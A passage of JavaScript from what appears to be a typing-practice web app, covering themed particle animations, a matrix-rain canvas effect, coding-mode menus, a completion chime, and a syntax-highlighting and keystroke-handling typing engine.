                    const iceHue = 185 + Math.random() * 30;
                    particle.style.width = isz + 'px';
                    particle.style.height = isz + 'px';
                    particle.style.top = (5 + Math.random() * 85) + '%';
                    particle.style.left = (5 + Math.random() * 90) + '%';
                    particle.style.background = `linear-gradient(135deg, hsla(${iceHue},100%,90%,0.8), hsla(${iceHue + 20},80%,70%,0.4), hsla(${iceHue},100%,95%,0.9))`;
                    particle.style.boxShadow = `0 0 8px hsla(${iceHue},100%,85%,0.4)`;
                    particle.style.animationDuration = iDur + 's';
                    particle.style.animationDelay = -(Math.random() * iDur) + 's';
                } else if (zenState.theme === 'mountain-fog') {
                    const fsz = 100 + Math.random() * 250;
                    const fDur = 8 + Math.random() * 15;
                    const fx = (Math.random() - 0.5) * 80;
                    const fx2 = (Math.random() - 0.5) * 80;
                    particle.style.width = fsz + 'px';
                    particle.style.height = fsz * 0.4 + 'px';
                    particle.style.top = (20 + Math.random() * 60) + '%';
                    particle.style.left = (Math.random() * 100) + '%';
                    particle.style.background = `radial-gradient(ellipse, rgba(180,190,200,0.15) 0%, transparent 70%)`;
                    particle.style.filter = `blur(${10 + Math.random() * 20}px)`;
                    particle.style.setProperty('--fx', fx + 'px');
                    particle.style.setProperty('--fx2', fx2 + 'px');
                    particle.style.animationDuration = fDur + 's';
                    particle.style.animationDelay = -(Math.random() * fDur) + 's';
                } else if (zenState.theme === 'prism-break') {
                    const psz = 4 + Math.random() * 10;
                    const pDur = 2 + Math.random() * 5;
                    const pHueDur = 2 + Math.random() * 4;
                    const py = -(30 + Math.random() * 100);
                    particle.style.width = psz + 'px';
                    particle.style.height = psz + 'px';
                    particle.style.top = (20 + Math.random() * 60) + '%';
                    particle.style.left = (Math.random() * 100) + '%';
                    particle.style.background = `hsl(${Math.random() * 360},100%,70%)`;
                    particle.style.boxShadow = `0 0 ${psz * 2}px currentColor`;
                    particle.style.setProperty('--py', py + 'px');
                    particle.style.animationDuration = `${pDur}s, ${pHueDur}s`;
                    particle.style.animationDelay = `${-(Math.random() * pDur)}s, ${-(Math.random() * pHueDur)}s`;
                } else if (zenState.theme === 'shadow-realm') {
                    const shsz = 40 + Math.random() * 100;
                    const shDur = 3 + Math.random() * 7;
                    const shHue = 260 + Math.random() * 80;
                    const shx = (Math.random() - 0.5) * 60;
                    const shy = (Math.random() - 0.5) * 40;
                    particle.style.width = shsz + 'px';
                    particle.style.height = shsz + 'px';
                    particle.style.top = (10 + Math.random() * 80) + '%';
                    particle.style.left = (5 + Math.random() * 90) + '%';
                    particle.style.background = `radial-gradient(ellipse, hsla(${shHue},60%,30%,0.5) 0%, hsla(${shHue + 30},40%,15%,0.2) 50%, transparent 80%)`;
                    particle.style.filter = `blur(${4 + Math.random() * 8}px)`;
                    particle.style.setProperty('--shx', shx + 'px');
                    particle.style.setProperty('--shy', shy + 'px');
                    particle.style.animationDuration = shDur + 's';
                    particle.style.animationDelay = -(Math.random() * shDur) + 's';
                } else if (zenState.theme === 'enchanted-garden') {
                    const leafColors = ['#228b22', '#2e8b57', '#3cb371', '#6b8e23', '#556b2f', '#8fbc8f'];
                    const leafSvgs = [
                        `url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='${encodeURIComponent(leafColors[Math.floor(Math.random() * leafColors.length)])}' d='M17 8C8 10 5.9 16.17 3.82 21.34L5.71 22l1-2.3A4.49 4.49 0 0 0 8 20c4 0 6-2 8-5s2-5 2-5-1-1-1-2z'/></svg>")`,
                        `url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='${encodeURIComponent(leafColors[Math.floor(Math.random() * leafColors.length)])}' d='M6.05 8.05a7 7 0 0 0 9.9 9.9L17 17l2-2-1.05-1.05a7 7 0 0 0-9.9-9.9L7 5 5 7z'/></svg>")`
                    ];
                    const lsz = 16 + Math.random() * 20;
                    const lDur = 6 + Math.random() * 8;
                    particle.style.width = lsz + 'px';
                    particle.style.height = lsz + 'px';
                    particle.style.left = (Math.random() * 100) + '%';
                    particle.style.background = leafSvgs[Math.floor(Math.random() * leafSvgs.length)];
                    particle.style.backgroundSize = 'contain';
                    particle.style.backgroundRepeat = 'no-repeat';
                    particle.style.opacity = (0.5 + Math.random() * 0.4).toString();
                    particle.style.animationDuration = lDur + 's';
                    particle.style.animationDelay = (Math.random() * lDur) + 's';
                } else if (zenState.theme === 'tidal-wave') {
                    const tw = 80 + Math.random() * 200;
                    const th = 40 + Math.random() * 100;
                    const tDur = 5 + Math.random() * 10;
                    const tHue = 190 + Math.random() * 40;
                    particle.style.width = tw + 'px';
                    particle.style.height = th + 'px';
                    particle.style.top = (50 + Math.random() * 50) + '%';
                    particle.style.left = (Math.random() * 100) + '%';
                    particle.style.setProperty('--tc', `hsla(${tHue}, 70%, 40%, 0.2)`);
                    particle.style.setProperty('--tb', (8 + Math.random() * 15) + 'px');
                    particle.style.setProperty('--twx', ((Math.random() - 0.5) * 200) + 'px');
                    particle.style.setProperty('--twy', ((Math.random() - 0.5) * 80) + 'px');
                    particle.style.animationDuration = tDur + 's';
                    particle.style.animationDelay = -(Math.random() * tDur) + 's';
                } else if (zenState.theme === 'plasma-storm') {
                    const psz = 8 + Math.random() * 25;
                    const pDur = 4 + Math.random() * 8;
                    const pHue = Math.random() * 360;
                    particle.style.width = psz + 'px';
                    particle.style.height = psz + 'px';
                    particle.style.top = (10 + Math.random() * 80) + '%';
                    particle.style.left = (10 + Math.random() * 80) + '%';
                    particle.style.background = `radial-gradient(circle, hsla(${pHue},100%,70%,0.8), hsla(${pHue + 60},100%,50%,0.3), transparent)`;
                    particle.style.boxShadow = `0 0 ${psz}px hsla(${pHue},100%,60%,0.5)`;
                    particle.style.setProperty('--px1', ((Math.random() - 0.5) * 300) + 'px');
                    particle.style.setProperty('--py1', ((Math.random() - 0.5) * 300) + 'px');
                    particle.style.setProperty('--px2', ((Math.random() - 0.5) * 300) + 'px');
                    particle.style.setProperty('--py2', ((Math.random() - 0.5) * 300) + 'px');
                    particle.style.setProperty('--px3', ((Math.random() - 0.5) * 300) + 'px');
                    particle.style.setProperty('--py3', ((Math.random() - 0.5) * 300) + 'px');
                    particle.style.animationDuration = pDur + 's';
                    particle.style.animationDelay = -(Math.random() * pDur) + 's';
                } else if (zenState.theme === 'butterfly') {
                    const bsz = 12 + Math.random() * 18;
                    const bDur = 12 + Math.random() * 20;
                    const bHue1 = Math.floor(Math.random() * 360);
                    const bHue2 = bHue1 + 30 + Math.floor(Math.random() * 60);
                    particle.style.setProperty('--bsz', bsz + 'px');
                    particle.style.setProperty('--bc1', `hsla(${bHue1},80%,60%,0.8)`);
                    particle.style.setProperty('--bc2', `hsla(${bHue2},80%,50%,0.7)`);
                    particle.style.setProperty('--by', (Math.random() * 80) + 'vh');
                    particle.style.setProperty('--by2', ((Math.random() - 0.5) * 30) + 'vh');
                    particle.style.setProperty('--bang', (Math.random() * 20 - 10) + 'deg');
                    particle.style.top = '0';
                    particle.style.animationDuration = bDur + 's';
                    particle.style.animationDelay = -(Math.random() * bDur) + 's';
                } else if (zenState.theme === 'nebula') {
                    const nsz = 100 + Math.random() * 300;
                    const nDur = 8 + Math.random() * 15;
                    const nHue = Math.floor(Math.random() * 360);
                    particle.style.width = nsz + 'px';
                    particle.style.height = nsz * (0.5 + Math.random() * 0.5) + 'px';
                    particle.style.top = (Math.random() * 90) + '%';
                    particle.style.left = (Math.random() * 90) + '%';
                    particle.style.background = `radial-gradient(ellipse, hsla(${nHue},70%,40%,0.3), hsla(${nHue + 40},50%,20%,0.1), transparent 70%)`;
                    particle.style.setProperty('--nb', (15 + Math.random() * 30) + 'px');
                    particle.style.setProperty('--nx', ((Math.random() - 0.5) * 150) + 'px');
                    particle.style.setProperty('--ny', ((Math.random() - 0.5) * 100) + 'px');
                    particle.style.setProperty('--no1', (0.1 + Math.random() * 0.2).toString());
                    particle.style.setProperty('--no2', (0.2 + Math.random() * 0.3).toString());
                    particle.style.animationDuration = nDur + 's';
                    particle.style.animationDelay = -(Math.random() * nDur) + 's';
                } else if (zenState.theme === 'zen-ripples') {
                    const rsz = 10 + Math.random() * 20;
                    const rDur = 4 + Math.random() * 6;
                    const rHue = 170 + Math.random() * 30;
                    particle.style.width = rsz + 'px';
                    particle.style.height = rsz + 'px';
                    particle.style.top = (10 + Math.random() * 80) + '%';
                    particle.style.left = (5 + Math.random() * 90) + '%';
                    particle.style.borderColor = `hsla(${rHue}, 50%, 60%, 0.5)`;
                    particle.style.animationDuration = rDur + 's';
                    particle.style.animationDelay = -(Math.random() * rDur) + 's';
                } else if (zenState.theme === 'celestial-map') {
                    const ssz = 1 + Math.random() * 3;

                    // 20% chance to be an aggressive "twinkler"
                    const isTwinkler = Math.random() < 0.2;

                    // Twinklers move slightly faster and pulse much quicker
                    const sDur = isTwinkler ? (0.5 + Math.random() * 1.5) : (3 + Math.random() * 5);
                    const mDur = isTwinkler ? (15 + Math.random() * 20) : (25 + Math.random() * 40);

                    particle.style.width = ssz + 'px';
                    particle.style.height = ssz + 'px';
                    particle.style.top = (5 + Math.random() * 90) + '%';
                    particle.style.left = '110vw'; // Start off-screen right
                    particle.style.setProperty('--ca', (Math.random() * 360) + 'deg');

                    // Only some non-twinkling stars get connector lines
                    if (isTwinkler || Math.random() > 0.3) particle.style.setProperty('--ca', 'none');

                    const pulseAnim = isTwinkler ? 'zenStarTwinkle' : 'zenStarPulse';

                    // Combine pulse/twinkle and drift animations
                    particle.style.animation = `${pulseAnim} ${sDur}s ease-in-out infinite alternate, zenConstellationDrift ${mDur}s linear infinite`;

                    // Negative delay to start them scattered across the screen
                    particle.style.animationDelay = `-${Math.random() * sDur}s, -${Math.random() * mDur}s`;
                } else if (zenState.theme === 'volcanic-ash') {
                    const asz = 2 + Math.random() * 5;
                    const aDur = 4 + Math.random() * 6;
                    const ashGray = Math.floor(40 + Math.random() * 80);
                    particle.style.width = asz + 'px';
                    particle.style.height = asz + 'px';
                    particle.style.left = (Math.random() * 100) + '%';
                    particle.style.background = `rgba(${ashGray},${ashGray - 10},${ashGray - 20},${0.3 + Math.random() * 0.5})`;
                    particle.style.animationDuration = aDur + 's';
                    particle.style.animationDelay = (Math.random() * aDur) + 's';
                    particle.style.opacity = (0.3 + Math.random() * 0.4).toString();
                } else if (zenState.theme === 'pixel-rain') {
                    const psz = 3 + Math.random() * 5;
                    const pDur = 1 + Math.random() * 3;
                    const pHue = 120 + Math.random() * 40;
                    particle.style.width = psz + 'px';
                    particle.style.height = psz + 'px';
                    particle.style.left = (Math.random() * 100) + '%';
                    particle.style.background = `hsla(${pHue},100%,${40 + Math.random() * 30}%,${0.3 + Math.random() * 0.5})`;
                    particle.style.boxShadow = `0 0 ${psz}px hsla(${pHue},100%,50%,0.4)`;
                    particle.style.animationDuration = pDur + 's';
                    particle.style.animationDelay = -(Math.random() * pDur) + 's';
                } else if (zenState.theme === 'astral-rings') {
                    const arsz = 20 + Math.random() * 40;
                    const arDur = 4 + Math.random() * 8;
                    const arHue = 260 + Math.random() * 80;
                    particle.style.width = arsz + 'px';
                    particle.style.height = arsz + 'px';
                    particle.style.top = (20 + Math.random() * 60) + '%';
                    particle.style.left = (20 + Math.random() * 60) + '%';
                    particle.style.borderColor = `hsla(${arHue},70%,60%,0.5)`;
                    particle.style.boxShadow = `0 0 ${arsz / 3}px hsla(${arHue},80%,50%,0.3), inset 0 0 ${arsz / 4}px hsla(${arHue},60%,40%,0.15)`;
                    particle.style.animationDuration = arDur + 's';
                    particle.style.animationDelay = -(Math.random() * arDur) + 's';
                } else if (zenState.theme === 'solar-winds') {
                    // Mix of fast flares and ambient dust
                    const isFlare = Math.random() < 0.15; // 15% flares

                    if (isFlare) {
                        particle.classList.add('zen-solar-flare');
                        const fsz = 2 + Math.random() * 3;
                        const fDur = 1.5 + Math.random() * 2.5; // Fast, but not overwhelming

                        particle.style.width = fsz + 'px';
                        particle.style.height = fsz + 'px';

                        // Spawn randomly along top and right taking advantage of CSS translates
                        if (Math.random() > 0.5) {
                            particle.style.top = '-10%';
                            particle.style.left = (Math.random() * 100) + '%';
                        } else {
                            particle.style.top = (Math.random() * 100) + '%';
                            particle.style.left = '110%';
                        }

                        particle.style.setProperty('--cx', '-120vw');
                        particle.style.setProperty('--cy', '120vh');
                        particle.style.setProperty('--flen', (60 + Math.random() * 120) + 'px');

                        particle.style.animationDuration = fDur + 's';
                        particle.style.animationDelay = (Math.random() * 15) + 's';
                    } else {
                        particle.classList.add('zen-solar-dust');
                        const dsz = 1 + Math.random() * 3;
                        const dDur = 8 + Math.random() * 15; // Slower drift
                        const pDur = 1 + Math.random() * 3; // Fast pulse

                        particle.style.width = dsz + 'px';
                        particle.style.height = dsz + 'px';
                        particle.style.top = (Math.random() * 100) + '%';
                        particle.style.left = (Math.random() * 100) + '%';

                        particle.style.animation = `zenSolarPulse ${pDur}s ease-in-out infinite alternate, zenSolarDrift ${dDur}s linear infinite`;
                        particle.style.animationDelay = `-${Math.random() * pDur}s, -${Math.random() * dDur}s`;
                    }
                }
            }

            container.appendChild(particle);
        }
    }

    function exitZenGarden() {
        zenState.active = false;
        if (zenState.timerInterval) clearInterval(zenState.timerInterval);
        if (zenState._escHandler) {
            document.removeEventListener('keydown', zenState._escHandler);
        }
        if (zenState._typeHandler) {
            document.removeEventListener('keydown', zenState._typeHandler);
        }
        zenState.startTime = null;
        codingState.mode = null;

        // Hide coding UI
        const codingUI = document.getElementById('coding-ui');
        if (codingUI) codingUI.classList.add('hidden');

        // Restore main UI
        const gameUI = document.getElementById('game-ui');
        const appHeader = document.getElementById('app-header');
        const navButtons = document.getElementById('top-nav-buttons');
        const footer = document.querySelector('footer') || document.querySelector('.site-footer');

        if (gameUI) gameUI.classList.remove('hidden');
        if (appHeader) appHeader.style.display = '';
        if (navButtons) navButtons.style.display = '';
        if (footer) footer.style.display = '';

        // Restore video audio state
        if (UI.bgVideo) {
            const wp = wallpapers.find(w => w.id === userConfig.wallpaperId);
            if (wp && wp.hasAudio && userConfig.wallpaperAudio) {
                UI.bgVideo.muted = false;
            }
        }

        state.gameMode = 'time';
        newGame();
    }

    // ── MATRIX RAIN ──
    let _matrixRainId = null;
    function startMatrixRain() {
        const canvas = document.getElementById('breach-matrix-canvas');
        if (!canvas) return;
        const ctx = canvas.getContext('2d');
        canvas.width = canvas.offsetWidth || window.innerWidth;
        canvas.height = canvas.offsetHeight || window.innerHeight;

        const cols = Math.floor(canvas.width / 20);
        const drops = Array(cols).fill(1);
        const chars = 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホ01ABCDEF<>/{}[]|\\';

        function rain() {
            ctx.fillStyle = 'rgba(0,0,0,0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = 'rgba(0,255,65,0.35)';
            ctx.font = '14px monospace';
            drops.forEach((y, i) => {
                const ch = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(ch, i * 20, y * 20);
                if (y * 20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            });
            _matrixRainId = requestAnimationFrame(rain);
        }
        if (_matrixRainId) cancelAnimationFrame(_matrixRainId);
        rain();
    }
    function stopMatrixRain() {
        if (_matrixRainId) { cancelAnimationFrame(_matrixRainId); _matrixRainId = null; }
        const canvas = document.getElementById('breach-matrix-canvas');
        if (canvas) { const ctx = canvas.getContext('2d'); ctx.clearRect(0, 0, canvas.width, canvas.height); }
    }

    function initCodingModeUI() {
        // Mode selection
        document.getElementById('syntax-storm-card').onclick = () => {
            codingState.mode = 'storm';
            renderLangGrid();
            showCodingScreen('coding-lang-select');
        };
        document.getElementById('algo-zen-card').onclick = () => {
            codingState.mode = 'algo';
            renderAlgoGrid();
            showCodingScreen('coding-algo-select');
        };
        document.getElementById('dsa-master-card').onclick = () => {
            codingState.mode = 'dsa';
            renderDsaGrid();
            showCodingScreen('coding-dsa-select');
        };
        document.getElementById('terminal-breach-card').onclick = () => {
            codingState.mode = 'breach';
            renderBreachGrid();
            showCodingScreen('coding-breach-select');
        };


        // Back buttons
        document.getElementById('coding-lang-back').onclick = () => showCodingScreen('coding-mode-select');
        document.getElementById('coding-cat-back').onclick = () => showCodingScreen('coding-lang-select');
        document.getElementById('coding-algo-back').onclick = () => showCodingScreen('coding-mode-select');
        document.getElementById('coding-dsa-back').onclick = () => showCodingScreen('coding-mode-select');
        document.getElementById('coding-breach-back').onclick = () => showCodingScreen('coding-mode-select');

        // Exit
        document.getElementById('coding-exit-btn').onclick = exitCodingMode;
        document.getElementById('coding-results-exit').onclick = exitCodingMode;

        // In-game exit buttons
        document.getElementById('storm-exit-btn').onclick = () => {
            if (codingState.timerInterval) { clearInterval(codingState.timerInterval); codingState.timerInterval = null; }
            if (codingState.wpmInterval) { clearInterval(codingState.wpmInterval); codingState.wpmInterval = null; }
            showCodingScreen('coding-mode-select');
        };
        document.getElementById('algo-exit-btn').onclick = () => {
            if (codingState.wpmInterval) { clearInterval(codingState.wpmInterval); codingState.wpmInterval = null; }
            showCodingScreen('coding-mode-select');
        };
        document.getElementById('dsa-exit-btn').onclick = () => {
            if (codingState.wpmInterval) { clearInterval(codingState.wpmInterval); codingState.wpmInterval = null; }
            showCodingScreen('coding-mode-select');
        };
        document.getElementById('breach-exit-btn').onclick = () => abortBreach();
        document.getElementById('coding-retry-btn').onclick = () => {
            if (codingState.mode === 'storm') launchStorm();
            else if (codingState.mode === 'algo') launchAlgo(codingState.algoIndex);
            else if (codingState.mode === 'dsa') launchDsa(codingState.dsaIndex);
            else if (codingState.mode === 'breach') launchBreach(codingState.breachIndex);
        };

        // Font size controls
        codingState._fontSize = 1.6; // default rem
        const adjustFont = (delta) => {
            codingState._fontSize = Math.min(1.6, Math.max(0.7, codingState._fontSize + delta));
            document.querySelectorAll('.coding-buffer').forEach(buf => {
                buf.style.fontSize = codingState._fontSize + 'rem';
            });
        };
        document.getElementById('storm-font-up').onclick = (e) => { e.stopPropagation(); adjustFont(0.1); };
        document.getElementById('storm-font-down').onclick = (e) => { e.stopPropagation(); adjustFont(-0.1); };
        document.getElementById('algo-font-up').onclick = (e) => { e.stopPropagation(); adjustFont(0.1); };
        document.getElementById('algo-font-down').onclick = (e) => { e.stopPropagation(); adjustFont(-0.1); };
        document.getElementById('dsa-font-up').onclick = (e) => { e.stopPropagation(); adjustFont(0.1); };
        document.getElementById('dsa-font-down').onclick = (e) => { e.stopPropagation(); adjustFont(-0.1); };

        // Apply default font size immediately
        adjustFont(0);

        // Width controls
        codingState._bufferWidth = 1200; // default px
        const adjustWidth = (delta) => {
            codingState._bufferWidth = Math.min(1200, Math.max(500, codingState._bufferWidth + delta));
            document.querySelectorAll('.coding-buffer-wrap').forEach(wrap => {
                wrap.style.maxWidth = codingState._bufferWidth + 'px';
            });
        };
        document.getElementById('storm-width-up').onclick = (e) => { e.stopPropagation(); adjustWidth(100); };
        document.getElementById('storm-width-down').onclick = (e) => { e.stopPropagation(); adjustWidth(-100); };
        document.getElementById('algo-width-up').onclick = (e) => { e.stopPropagation(); adjustWidth(100); };
        document.getElementById('algo-width-down').onclick = (e) => { e.stopPropagation(); adjustWidth(-100); };

        // Apply default width immediately
        adjustWidth(0);

        // Theme toggle dropdown
        document.querySelectorAll('.coding-theme-toggle').forEach(btn => {
            btn.onclick = (e) => {
                e.stopPropagation();
                const pills = btn.closest('.coding-theme-pills');
                // Close other dropdowns
                document.querySelectorAll('.coding-theme-pills').forEach(p => {
                    if (p !== pills) p.classList.remove('open');
                });
                pills.classList.toggle('open');
            };
        });

        // Close dropdown on outside click
        document.addEventListener('click', () => {
            document.querySelectorAll('.coding-theme-pills').forEach(p => p.classList.remove('open'));
        });

        // ── Helper: apply a theme by name to all buffer wraps + update pill active states ──
        function applyCodingTheme(theme) {
            document.querySelectorAll('.coding-theme-pill').forEach(p => {
                p.classList.toggle('active', p.dataset.theme === theme);
            });
            document.querySelectorAll('.coding-buffer-wrap, .coding-screen, #coding-results').forEach(wrap => {
                if (theme === 'midnight') {
                    wrap.removeAttribute('data-theme');
                } else {
                    wrap.setAttribute('data-theme', theme);
                }
            });
        }

        // ── Restore saved theme (default: gruvbox for new users) ──
        const savedCodingTheme = localStorage.getItem('codingTheme') || 'gruvbox';
        applyCodingTheme(savedCodingTheme);

        // Theme switching
        document.querySelectorAll('.coding-theme-pill').forEach(pill => {
            pill.onclick = (e) => {
                e.stopPropagation();
                const theme = pill.dataset.theme;
                // Save to localStorage so it persists across sessions
                localStorage.setItem('codingTheme', theme);
                applyCodingTheme(theme);
                // Close dropdown
                document.querySelectorAll('.coding-theme-pills').forEach(p => p.classList.remove('open'));
            };
        });
    }

    // ── LANGUAGE GRID ──
    function renderLangGrid() {
        const grid = document.getElementById('coding-lang-grid');
        grid.innerHTML = codingLanguages.map(lang =>
            `<div class="coding-lang-card" data-lang="${lang.id}">
                <span class="lang-icon">${lang.icon}</span>
                <span class="lang-name">${lang.name}</span>
            </div>`
        ).join('');
        grid.querySelectorAll('.coding-lang-card').forEach(card => {
            card.onclick = () => {
                codingState.lang = card.dataset.lang;
                renderCatGrid();
                showCodingScreen('coding-cat-select');
            };
        });
    }

    // ── CATEGORY GRID ──
    function renderCatGrid() {
        const lang = codingLanguages.find(l => l.id === codingState.lang);
        document.getElementById('coding-cat-title').textContent = `${lang.name.toUpperCase()} SYNTAX`;
        const grid = document.getElementById('coding-cat-grid');
        grid.innerHTML = codingCategories.map(cat => {
            const snippets = codingSnippets[codingState.lang]?.[cat.id] || [];
            return `<div class="coding-cat-card" data-cat="${cat.id}">
                <div class="cat-icon"><i class="${cat.icon}"></i></div>
                <div class="cat-info">
                    <div class="cat-name">${cat.name}</div>
                    <div class="cat-count">${snippets.length} snippets</div>
                </div>
            </div>`;
        }).join('');
        grid.querySelectorAll('.coding-cat-card').forEach(card => {
            card.onclick = () => {
                codingState.category = card.dataset.cat;
                launchStorm();
            };
        });
    }

    // ── ALGORITHM GRID ──
    function renderAlgoGrid() {
        const grid = document.getElementById('coding-algo-grid');
        grid.innerHTML = algoData.map((algo, i) =>
            `<div class="coding-algo-card" data-idx="${i}">
                <div class="algo-category">${algo.category}</div>
                <div class="algo-name">${algo.name}</div>
                <div class="algo-complexity">${algo.complexity}</div>
            </div>`
        ).join('');
        grid.querySelectorAll('.coding-algo-card').forEach(card => {
            card.onclick = () => launchAlgo(parseInt(card.dataset.idx));
        });
    }

    // ── COMPLETION SOUND SYSTEM ──
    // Plays a zen chime using Web Audio API (guaranteed to work in Tauri)
    function playCompletionChime(quality) {
        if (!audioCtx) return;
        const t = audioCtx.currentTime;

        // quality: 'perfect' | 'great' | 'good'
        const chimes = {
            perfect: [523.25, 659.25, 783.99, 1046.5], // C5→E5→G5→C6 (perfect solve fanfare)
            great: [523.25, 659.25, 783.99],          // C5→E5→G5 (clean ascending)
            good: [440, 523.25, 659.25],              // A4→C5→E5 (warm)
        };
        const freqs = chimes[quality] || chimes.good;

        freqs.forEach((freq, i) => {
            const osc = audioCtx.createOscillator();
            const gain = audioCtx.createGain();
            osc.connect(gain);
            gain.connect(audioCtx.destination);

            osc.type = 'sine';
            osc.frequency.setValueAtTime(freq, t + i * 0.18);

            const startTime = t + i * 0.18;
            gain.gain.setValueAtTime(0, startTime);
            gain.gain.linearRampToValueAtTime(0.28, startTime + 0.04);
            gain.gain.exponentialRampToValueAtTime(0.001, startTime + 0.9);

            osc.start(startTime);
            osc.stop(startTime + 0.95);
        });
    }


    // ── DSA_MASTER GRID ──
    function renderDsaGrid() {
        const grid = document.getElementById('coding-dsa-grid');
        if (!grid) return;
        grid.innerHTML = dsaData.map((dsa, i) => {
            const color = dsa.difficulty === 'EASY' ? '#00b8a3' : dsa.difficulty === 'MEDIUM' ? '#ffc01e' : '#ff375f';
            return `<div class="coding-algo-card dsa-list-card" data-idx="${i}" style="border-left: 3px solid ${color}">
                <div class="dsa-list-num" style="color:${color}">${String(i + 1).padStart(2, '0')}</div>
                <div class="dsa-list-info">
                    <div class="algo-name">${dsa.name}</div>
                    <div class="algo-category">${dsa.category}</div>
                </div>
                <div class="algo-complexity" style="color:${color}">${dsa.difficulty}</div>
            </div>`;
        }).join('');
        grid.querySelectorAll('.coding-algo-card').forEach(card => {
            card.onclick = () => launchDsa(parseInt(card.dataset.idx));
        });
    }

    // ── SYNTAX GLOW: RENDER BUFFER ──
    function renderCodeBuffer(code, bufferId, lang) {
        const buffer = document.getElementById(bufferId);
        const keywords = langKeywords[lang] || langKeywords.javascript;
        const chars = code.split('');

        // Pre-compute token types for each character
        const tokenTypes = new Array(chars.length).fill('');
        let i = 0;
        while (i < chars.length) {
            // Comments
            if (chars[i] === '/' && chars[i + 1] === '/') {
                let end = i;
                while (end < chars.length && chars[end] !== '\n') end++;
                for (let j = i; j < end; j++) tokenTypes[j] = 'kw-comment';
                i = end; continue;
            }
            if (chars[i] === '#' && (lang === 'python' || lang === 'c' || lang === 'cpp')) {
                if (lang === 'python') {
                    let end = i;
                    while (end < chars.length && chars[end] !== '\n') end++;
                    for (let j = i; j < end; j++) tokenTypes[j] = 'kw-comment';
                    i = end; continue;
                }
            }
            // Strings
            if (chars[i] === '"' || chars[i] === "'" || chars[i] === '`') {
                const q = chars[i]; let end = i + 1;
                while (end < chars.length && chars[end] !== q) end++;
                if (end < chars.length) end++;
                for (let j = i; j < end; j++) tokenTypes[j] = 'kw-string';
                i = end; continue;
            }
            // Numbers
            if (/\d/.test(chars[i]) && (i === 0 || /[\s(,=+\-*/<>[\]{};:]/.test(chars[i - 1]))) {
                let end = i;
                while (end < chars.length && /[\d.]/.test(chars[end])) end++;
                for (let j = i; j < end; j++) tokenTypes[j] = 'kw-number';
                i = end; continue;
            }
            // Python decorators (@property, @classmethod, etc.)
            if (chars[i] === '@') {
                let end = i + 1;
                while (end < chars.length && /[a-zA-Z0-9_]/.test(chars[end])) end++;
                if (end > i + 1) {
                    for (let j = i; j < end; j++) tokenTypes[j] = 'kw-keyword';
                    i = end; continue;
                }
                // Lone @ (like in email), just skip
                i++; continue;
            }
            // Keywords/identifiers
            if (/[a-zA-Z_]/.test(chars[i])) {
                let end = i;
                while (end < chars.length && /[a-zA-Z0-9_]/.test(chars[end])) end++;
                const word = chars.slice(i, end).join('');
                if (keywords.includes(word)) {
                    for (let j = i; j < end; j++) tokenTypes[j] = 'kw-keyword';
                } else if (end < chars.length && chars[end] === '(') {
                    for (let j = i; j < end; j++) tokenTypes[j] = 'kw-function';
                }
                i = end; continue;
            }
            // Operators
            if ('=+-*/<>!&|^~%'.includes(chars[i])) {
                tokenTypes[i] = 'kw-operator';
            }
            i++;
        }

        // Find bracket pairs for matching
        const bracketMap = {};
        const stack = [];
        chars.forEach((ch, idx) => {
            if ('{(['.includes(ch)) {
                stack.push(idx);
            } else if ('})]'.includes(ch) && stack.length) {
                const open = stack.pop();
                bracketMap[open] = idx;
                bracketMap[idx] = open;
            }
        });

        buffer.innerHTML = chars.map((ch, idx) => {
            const tokenCls = tokenTypes[idx] ? ` ${tokenTypes[idx]}` : '';
            const isBracket = '{([})]'.includes(ch);
            const bracketData = isBracket ? ` data-bracket="${bracketMap[idx] ?? ''}"` : '';
            const cursorCls = idx === 0 ? ' cursor' : '';
            const display = ch === '\n' ? '\n' : (ch === ' ' ? ' ' : ch);
            return `<span class="code-char${tokenCls}${cursorCls}" data-idx="${idx}"${bracketData}>${display}</span>`;
        }).join('');

        buffer._tokenTypes = tokenTypes;
        buffer._bracketMap = bracketMap;
        buffer._code = code;
    }

    // ── SYNTAX GLOW: TYPING ENGINE ──
    function initTypingEngine(bufferId, inputId, onComplete) {
        const buffer = document.getElementById(bufferId);
        const input = document.getElementById(inputId);
        const code = buffer._code;

        codingState.charIndex = 0;
        codingState.correct = 0;
        codingState.total = 0;
        codingState.startTime = null;

        input.value = '';
        input.focus();
        input.onblur = () => setTimeout(() => input.focus(), 50);

        // Click buffer to focus
        buffer.parentElement.onclick = () => input.focus();

        // Remove any previous handler to prevent stacking
        if (codingState._currentHandler && codingState._currentInput) {
            codingState._currentInput.removeEventListener('keydown', codingState._currentHandler);
        }

        const handler = function (e) {
            if (e.key === 'Tab') {
                e.preventDefault();
                // Insert spaces for tab
                for (let t = 0; t < 4 && codingState.charIndex < code.length; t++) {
                    if (code[codingState.charIndex] === ' ') {
                        processChar(' ', buffer, code);
                    } else break;
                }
                return;
            }
            if (e.key === 'Enter') {
                e.preventDefault();
                if (code[codingState.charIndex] === '\n') {
                    processChar('\n', buffer, code);
                    // Auto-skip leading whitespace after newline
                    while (codingState.charIndex < code.length && code[codingState.charIndex] === ' ') {
                        processChar(' ', buffer, code);
                    }
                }
                return;
            }
            // Ctrl+Backspace — delete entire word
            if (e.key === 'Backspace' && e.ctrlKey) {
                e.preventDefault();
                if (codingState.charIndex > 0) {
                    while (codingState.charIndex > 0 && /[\s\n]/.test(code[codingState.charIndex - 1])) {
                        backspaceOne(buffer, code);
                    }
                    while (codingState.charIndex > 0 && /[a-zA-Z0-9_]/.test(code[codingState.charIndex - 1])) {
                        backspaceOne(buffer, code);
                    }
                    buffer.querySelectorAll('.code-char.cursor').forEach(el => el.classList.remove('cursor'));
                    const curEl = buffer.querySelector(`.code-char[data-idx="${codingState.charIndex}"]`);
                    if (curEl) curEl.classList.add('cursor');
                }
                return;
            }
            // Regular Backspace
            if (e.key === 'Backspace') {
                e.preventDefault();
                if (codingState.charIndex > 0) {
                    backspaceOne(buffer, code);
                    buffer.querySelectorAll('.code-char.cursor').forEach(el => el.classList.remove('cursor'));
                    const curEl = buffer.querySelector(`.code-char[data-idx="${codingState.charIndex}"]`);
                    if (curEl) curEl.classList.add('cursor');
                }
                return;
            }
